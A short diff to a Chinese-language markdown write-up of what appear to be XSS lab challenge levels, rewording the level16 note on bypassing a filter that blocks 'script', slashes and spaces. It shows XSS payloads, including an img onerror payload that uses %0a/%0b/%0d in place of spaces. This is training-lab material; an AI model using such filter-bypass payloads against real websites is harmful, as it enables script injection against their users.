@@ -114,7 +114,7 @@ payload："><script>alert(1)</script><"
 ```
 
 ## level16
-经测试，script和/均被过滤，空格符号也无法使用，但是on事件可以使用。使用img标签，将空格用%0a、%0b、%0d成功。</br>
+经测试，script和/均被过滤，空格符号也无法使用，但是on事件可以使用。使用img标签，将空格用url编码%0a、%0b、%0d替换，测试成功。</br>
 ```
 payload：?keyword=<img%0dsrc=a%0donerror=alert(1)>
 ```
